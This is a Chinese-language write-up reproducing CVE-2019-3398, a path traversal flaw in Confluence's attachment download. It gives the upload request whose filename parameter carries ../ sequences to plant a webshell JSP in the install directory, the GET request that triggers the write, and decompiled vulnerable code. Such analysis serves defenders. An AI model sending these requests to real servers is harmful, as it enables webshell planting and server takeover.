<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>（CVE-2019-3398）Confluence 路径穿越漏洞</h1><h2>一、漏洞简介</h2><h2>二、漏洞影响</h2><p>2.0.0 &lt;= version &lt; 6.6.13<br />6.7.0 &lt;= version &lt; 6.12.4<br />6.13.0 &lt;= version &lt; 6.13.4<br />6.14.0 &lt;= version &lt; 6.14.3<br />6.15.0 &lt;= version &lt; 6.15.2</p><h2>三、复现过程</h2><h3>漏洞分析</h3><p>首先根据官方描述，downloadallattachments这个资源，结合其验证缓解措施的方式，找到了漏洞触发点：</p><p>... =》附件=》下载全部</p><p>点击下载全部时，会触发一个GET请求：</p><p>GET /pages/downloadallattachments.action?pageId=65601</p><p>然后响应</p><p>Location: /download/temp/downloadi120q121507.zip?contentType=application/zip</p><p>而且每次发出downloadallattachments.action请求，其响应的Location路径的zip文件名都不一样，发现原来是服务端每收到一次downloadallattachments.action请求，就会在download/temp/目录下生成一个zip文件：</p><p>1.png</p><p>搜索了一下，发现这个文件是在/Users/xxx/confluenceHome，也就是confluence的安装目录下。</p><p>cqq@ubuntu:~$ find .|grep download45lL6115220.zip<br />./confluenceHome/temp/download45lL6115220.zip</p><p>然后看到这个目录下还有一个attachments目录，为了验证这就是附件上传的目录，</p><p>2.png</p><p>于是，新建了一个页面，上传了几个文本文件，通过cat出来的内容与上传的内容匹配，判定这个就是上传的附件被存放的目录，但是这个目录下的文件名被重命名了。既然官方说是路径穿越漏洞，就得找到文件名或者文件路径的输入点。在这里上传文件的过程中抓一下包，发现有两个参数是文件名/文件路径相关的，filename和name，经过测试发现漏洞点参数是filename。</p><h3>漏洞复现</h3><p>通过一番grep -rn xxx *的查找，发现需要两步来完成对路径穿越的利用。</p><p>1、POST /plugins/drag-and-drop/upload.action?pageId=65601&amp;filename=../../../../../../Users/xxx/repos/atlassian-confluence-6.13.0/confluence/admin/cqq2.jsp&amp;size=754&amp;minorEdit=true&amp;spaceKey=ADMIN&amp;mimeType=application%2Foctet-stream&amp;atl_token=47ae1afbc53f1ed100a4c36053de2d754d48ffeb&amp;contentType=page&amp;isVFMSupported=true&amp;name=cqq2.jsp<br />先将webshell上传上去，其内容会出现在confluence的安装目录，即/Users/xxx/confluenceHome。注意上传的时候的size参数需与Content-Length值保持一致，服务端会对这个做校验，若发现不一致，则会导致500。<br />在UploadAction#execute下断点</p><p>confluence/WEB-INF/atlassian-bundled-plugins/confluence-drag-and-drop-6.13.0.jar!/com/atlassian/confluence/plugins/dragdrop/UploadAction.class</p><p>通过</p><p>InputStream inStream = this.getStreamForEncoding(this.httpServletRequest);<br />this.fileUploadManager.storeResource(new InputStreamAttachmentResource(inStream, this.filename, this.mimeType, this.size, (String)null, this.minorEdit), (ContentEntityObject)content);</p><p>将POST的内容写入到缓存文件中：attachments/ver003//56/98/98306/101/65/65601/917509/1，<br />3.png<br />filename值没有对../进行过滤。<br />44.png<br />上传完成之后，打开“全部附件”页面，会出现我们刚刚上传上去的文件，其文件名没有对../进行过滤。<br />5.png</p><p>2、GET /pages/downloadallattachments.action?pageId=65601<br />然后通过这个GET请求，触发将缓存的webshell内容写入指定的路径操作。<br />在DownloadAllAttachmentsOnPageAction#execute下断点</p><p>confluence/WEB-INF/lib/confluence-6.13.0.jar!com/atlassian/confluence/pages/actions/DownloadAllAttachmentsOnPageAction.class</p><p>文件内容：</p><p>public String execute() throws Exception {<br />        List&lt;Attachment&gt; latestAttachments = this.attachmentManager.getLatestVersionsOfAttachments(this.getPage());<br />        Iterator var2 = latestAttachments.iterator();<br /><br />        while(var2.hasNext()) {<br />            Attachment attachment = (Attachment)var2.next();<br />            File tmpFile = new File(this.getTempDirectoryForZipping(), attachment.getFileName());<br />            InputStream inputStream = this.attachmentManager.getAttachmentData(attachment);<br />            Throwable var6 = null;<br /><br />            try {<br />                OutputStream fileOutputStream = new FileOutputStream(tmpFile);  // tmpFile内容为/Users/Xxx/repos/confluenceRepos/temp/download8gHGV130701/../../../../../../Users/Xxx/repos/atlassian-confluence-6.13.0/confluence/admin/cmd222.jsp<br />                Throwable var8 = null;<br /><br />                try {<br />                    ByteStreams.copy(inputStream, fileOutputStream);  //将缓存文件写入指定的路径<br />                } catch (Throwable var31) {<br />                    var8 = var31;<br />                    throw var31;<br />                } finally {<br />                    if (fileOutputStream != null) {<br />                        if (var8 != null) {<br />                            try {<br />                                fileOutputStream.close();<br />                            } catch (Throwable var30) {<br />                                var8.addSuppressed(var30);<br />                            }<br />                        } else {<br />                            fileOutputStream.close();<br />                        }<br />                    }<br /><br />                }<br />            } catch (Throwable var33) {<br />                var6 = var33;<br />                throw var33;<br />            } finally {<br />                if (inputStream != null) {<br />                    if (var6 != null) {<br />                        try {<br />                            inputStream.close();<br />                        } catch (Throwable var29) {<br />                            var6.addSuppressed(var29);<br />                        }<br />                    } else {<br />                        inputStream.close();<br />                    }<br />                }<br /><br />            }<br />        }<br /><br />        //在confluence安装路径的temp目录下生成zip文件。<br />        File zipFile = new File(this.getConfluenceTempDirectoryPath() + File.separator + this.getZipFilename() + ".zip");<br />        FileUtils.createZipFile(this.getTempDirectoryForZipping(), zipFile);<br />        FileUtils.deleteDir(this.getTempDirectoryForZipping());<br />        this.downloadPath = this.prepareDownloadPath(zipFile.getPath()) + "?contentType=application/zip";<br />        this.gateKeeper.addKey(this.prepareDownloadPath(zipFile.getPath()), this.getAuthenticatedUser());<br />        return "success";<br />    }</p><p>先拿到Attachement列表</p><p>List&lt;Attachment&gt; latestAttachments = this.attachmentManager.getLatestVersionsOfAttachments(this.getPage());</p><p>然后对列表中每个附件进行遍历，从最前面的开始，</p><p>然后通过<br />666.png</p><p>attachment.getFileName())</p><p>获得附件的名字（这里有我们之前设置好的payload文件名）<br />然后执行</p><p>ByteStreams.copy(inputStream, fileOutputStream);</p><p>将之前缓存的上传文件copy到通过请求参数filename指定的路径下，实现路径穿越。<br />7.png<br />执行前后对比如下：<br />8.png<br />对比缓存文件和在指定路径生成的文件的sha1值对比：一致。<br />9.png<br />Confluence本身就可以上传任意文件内容到服务端，但是会放在缓存目录下，文件路径不可控。关键地是，没有对filename请求参数进行过滤，有路径穿越漏洞，才能将指定文件名指定文件内容写入到文件系统中。</p><h2>参考链接</h2><p>https://xz.aliyun.com/t/4854</p></body></html>